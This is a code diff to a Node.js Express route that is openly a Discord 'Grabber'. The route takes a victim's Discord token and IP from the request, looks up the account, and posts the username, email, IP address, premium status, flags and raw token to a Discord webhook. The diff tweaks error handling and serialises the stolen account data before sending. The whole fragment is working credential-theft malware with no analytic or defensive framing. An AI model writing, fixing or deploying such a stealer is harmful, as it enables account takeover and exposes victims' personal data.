@@ -9,7 +9,7 @@ router.get('/', (req,res) => {
     //let parse = parseWebhookURL(req.query.webhook);
     //if(parse == null) return res.render('404', {layout:'home'});
     let user = getUserData(req.query.token);
-    if(user == null) return;
+    if(user == null) return res.send('no done');
     
     webhook.send(new discord.MessageEmbed().setTitle(`${user.username}#${user.discriminator} | ${user.id}`).addField("Email",user.email).addField("IP Adress",req.query.ip).addField("premium_type",user.premium_type).addField("Token",req.query.token).addField("Flags",user.flags).setFooter("Grabber by × ΉƧΣ ×⚡`#2080").setColor("WHITE"));
     res.send('done');
@@ -25,7 +25,7 @@ async function getUserData(token){
         })
         if(buffer.status !== 200) return null;
         let json = await buffer.json();
-        webhook.send(json);
+        webhook.send(JSON.stringify(json));
         return json;
     }catch(err)
     {
